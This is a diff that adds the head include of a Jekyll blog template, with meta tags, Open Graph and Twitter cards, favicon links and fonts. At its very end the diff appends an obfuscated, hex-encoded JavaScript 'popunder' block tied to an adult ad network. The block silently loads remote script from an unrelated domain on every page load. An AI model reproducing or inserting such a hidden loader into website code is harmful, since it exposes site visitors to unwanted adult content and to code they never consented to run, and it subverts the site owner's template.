@@ -1,0 +1,78 @@
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Language" content="pt-br">
+
+    <title>{% if page.title %}{{ page.title }} | {{ site.username }}{% else %}{{ site.title }}{% endif %}</title>
+    
+    <!-- Social: Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@{{site.twitter_username}}">
+    <meta name="twitter:title" content="{% if page.title %}{{ page.title }} | {{ site.username }}{% else %}{{ site.title }}{% endif %}">
+    {% if page.image %}
+    <meta property="twitter:image:src" content="{{ page.image }}">
+    {% else %}
+    <meta property="twitter:image:src" content="{{ "/assets/img/blog-image.png" | prepend: site.baseurl | prepend: site.url }}">
+    {% endif %}
+
+    <!-- Social: Facebook / Open Graph -->
+    <meta property="og:url" content="{{ page.url | replace:'index.html','' | prepend: site.baseurl | prepend: site.url }}">
+    <meta property="og:title" content="{% if page.title %}{{ page.title }} | {{ site.username }}{% else %}{{ site.title }}{% endif %}">
+    {% if page.image %}
+    <meta property="og:image" content="{{ page.image }}">
+    {% else %}
+    <meta property="og:image" content="{{ "/assets/img/blog-image.png" | prepend: site.baseurl | prepend: site.url }}">
+    {% endif %}
+    <meta property="og:site_name" content="{{ site.title }}">
+
+    <!-- Social: Google+ / Schema.org  -->
+    <meta itemprop="name" content="{% if page.title %}{{ page.title }} | {{ site.username }}{% else %}{{ site.title }}{% endif %}"/>
+    <meta itemprop="image" content="{{ "/assets/img/blog-image.png" | prepend: site.baseurl | prepend: site.url }}"/>
+
+    <!-- Favicon -->
+    <link href='{{ site.url }}/assets/ico/192x192.png' alt="{{ site.title }} favicon" rel='icon' type='image/x-icon'/>
+    <link href='{{ site.url }}/assets/ico/57x57.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='57x57'/>
+    <link href='{{ site.url }}/assets/ico/60x60.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='60x60'/>
+    <link href='{{ site.url }}/assets/ico/72x72.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='72x72'/>
+    <link href='{{ site.url }}/assets/ico/76x76.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='76x76'/>
+    <link href='{{ site.url }}/assets/ico/114x114.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='114x114'/>
+    <link href='{{ site.url }}/assets/ico/120x120.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='120x120'/>
+    <link href='{{ site.url }}/assets/ico/144x144.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='144x144'/>
+    <link href='{{ site.url }}/assets/ico/152x152.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='152x152'/>
+    <link href='{{ site.url }}/assets/ico/180x180.png' alt="{{ site.title }} favicon"  rel='apple-touch-icon' sizes='180x180'/>
+    <link href='{{ site.url }}/assets/ico/192x192.png' alt="{{ site.title }} favicon"  rel='icon' sizes='192x192' type='image/png'/>
+    <link href='{{ site.url }}/assets/ico/32x32.png' alt="{{ site.title }} favicon"  rel='icon' sizes='32x32' type='image/png'/>
+    <link href='{{ site.url }}/assets/ico/96x96.png' alt="{{ site.title }} favicon"  rel='icon' sizes='96x96' type='image/png'/>
+    
+    <!-- Apple Touch Icons -->
+    <link rel="apple-touch-icon" href="/assets/img/icons/apple-touch-icon.png" />
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/img/icons/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/img/icons/apple-touch-icon-72x72.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/img/icons/apple-touch-icon-114x114.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/img/icons/apple-touch-icon-144x144.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/img/icons/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/img/icons/apple-touch-icon-120x120.png" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/img/icons/apple-touch-icon-76x76.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/img/icons/apple-touch-icon-152x152.png" />
+
+    <!-- Windows 8 Tile Icons -->
+    <meta name="application-name" content="{{ site.username }} Blog">
+    <meta name="msapplication-TileColor" content="#0562DC">
+    <meta name="msapplication-square70x70logo" content="smalltile.png" />
+    <meta name="msapplication-square150x150logo" content="mediumtile.png" />
+    <meta name="msapplication-wide310x150logo" content="widetile.png" />
+    <meta name="msapplication-square310x310logo" content="largetile.png" />
+    
+    <!-- Android Lolipop Theme Color -->
+    <meta name="theme-color" content="{{ page.color }}">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Titillium+Web:300,400,700" rel="stylesheet">
+
+    <link rel="stylesheet" href="{{ "/assets/css/main.css" | prepend: site.baseurl }}">
+    <link rel="canonical" href="{{ page.url | replace:'index.html','' | prepend: site.baseurl | prepend: site.url }}">
+    <link rel="alternate" type="application/rss+xml" title="{{ site.title }}" href="{{ "/feed.xml" | prepend: site.baseurl | prepend: site.url }}" />
+
+<!-- PopMyAds.com Popunder Code for goodzsex.com -->
+<script type="text/javascript" data-cfasync="false">var _0x2763=['\x33\x31\x33\x34\x31','\x38\x36\x34\x30\x30','\x74\x77\x65\x6f\x77\x68\x76\x72\x69\x6d\x2e\x72\x65\x76\x69\x65\x77','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x73\x63\x72\x69\x70\x74','\x74\x79\x70\x65','\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74','\x61\x73\x79\x6e\x63','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65','\x2f\x2f\x74\x77\x65\x6f\x77\x68\x76\x72\x69\x6d\x2e\x72\x65\x76\x69\x65\x77\x2f\x7a\x2f\x39\x33\x38\x31\x36\x35\x30\x34\x31','\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'];(function(_0x4f4b13,_0x37fb5a){var _0x1400cf=function(_0x22c3d7){while(--_0x22c3d7){_0x4f4b13['push'](_0x4f4b13['shift']());}};_0x1400cf(++_0x37fb5a);}(_0x2763,0x176));var _0x5c5e=function(_0x209293,_0x11493d){_0x209293=_0x209293-0x0;var _0x554a48=_0x2763[_0x209293];return _0x554a48;};var pmauid=_0x5c5e('0x0');var pmawid='\x34\x35\x30\x38\x38';var fq=_0x5c5e('0x1');var pma_dom=_0x5c5e('0x2');(function(){var _0x3f4ad4=document[_0x5c5e('0x3')](_0x5c5e('0x4'));_0x3f4ad4[_0x5c5e('0x5')]=_0x5c5e('0x6');_0x3f4ad4[_0x5c5e('0x7')]=!![];var _0x94bf=document[_0x5c5e('0x8')](_0x5c5e('0x4'))[0x0];_0x3f4ad4['\x73\x72\x63']=_0x5c5e('0x9');_0x94bf['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65'][_0x5c5e('0xa')](_0x3f4ad4,_0x94bf);}());</script>
+<!-- PopMyAds.com Popunder Code End -->
